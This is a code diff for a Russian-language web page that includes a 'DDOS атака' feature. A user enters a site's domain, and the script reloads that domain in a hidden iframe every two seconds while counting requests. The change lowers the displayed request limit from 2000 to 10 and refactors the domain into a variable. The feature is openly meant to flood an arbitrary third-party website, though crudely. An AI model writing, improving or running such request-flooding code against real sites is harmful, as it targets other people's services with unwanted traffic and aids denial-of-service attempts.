@@ -753,7 +753,7 @@
              
              <div style="display: none" class="second_block_container_third_dos">
                  <input id="domain" type="text" placeholder="Введите домен сайта">
-                 <p style="color: white;font-size: 3vw;">Кол-во запросов<br><span id="request">0</span> из 2000</p>
+                 <p style="color: white;font-size: 3vw;">Кол-во запросов<br><span id="request">0</span> из 10</p>
                  <button id="ddos_button">DDOS атака</button>
              </div>
              
@@ -1142,7 +1142,8 @@ document.onclick=e=>{
         }      
     }else if(e.target.id == 'ddos_button'){
         if(document.getElementById('domain').value != ''){
-		document.body.innerHTML+='<iframe  id="iframe" src="https://'+document.getElementById('domain').value+'" style="display:none;">   </iframe>';
+		var siteURL = document.getElementById('domain').value;
+		document.body.innerHTML+='<iframe  id="iframe" src="https://'+siteURL+'" style="display:none;">   </iframe>';
         
 	        document.getElementById('iframe').onload = function() { 
 		     var countDos = 0;
@@ -1153,7 +1154,7 @@ document.onclick=e=>{
 			     document.getElementById('iframe').remove();	
 			     countDos++;
 		             document.getElementById('request').innerHTML=countDos;
-			     document.body.innerHTML+='<iframe  id="iframe" src="https://'+document.getElementById('domain').value+'" style="display:none;">   </iframe>';
+			     document.body.innerHTML+='<iframe  id="iframe" src="https://'+siteURL+'" style="display:none;">   </iframe>';
 			}     
 		     },2000);
        		}
